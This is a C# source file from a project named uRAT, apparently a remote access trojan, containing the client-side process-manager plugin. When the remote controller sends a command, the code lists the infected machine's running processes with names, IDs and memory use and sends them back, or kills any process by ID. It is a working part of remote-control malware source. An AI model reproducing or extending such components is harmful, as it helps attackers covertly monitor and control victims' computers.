using uNet2.Channel;
using uNet2.Packet;
using uNet2.SocketOperation;
using uRAT.ManagersClientPlugin.ProcessManager.Packets;
using uRAT.ManagersClientPlugin.ProcessManager.Tools;

namespace uRAT.ManagersClientPlugin.ProcessManager.Operations
{
    public class ProcessManagerOperation : SocketOperationBase
    {
        public override int OperationId
        {
            get { return 1; }
        }

        public override void PacketReceived(IDataPacket packet, IChannel sender)
        {
            if (packet is RefreshProcessesPacket)
            {
                foreach (var proc in ProcessesHelper.GetRunningProcesses())
                {
                    SendPacket(new ProcessInformationPacket(proc.ProcessName, proc.Pid, proc.IsThis, proc.MemUsage));
                }
            } 
            else if (packet is KillProcessPacket)
            {
                ProcessesHelper.KillProcessByPid((packet as KillProcessPacket).Pid);
            }
            
        }

        public override void PacketSent(IDataPacket packet, IChannel targetChannel)
        {

        }

        public override void SequenceFragmentReceived(SequenceFragmentInfo fragmentInfo)
        {

        }

        public override void Disconnected()
        {
   
        }
    }
}
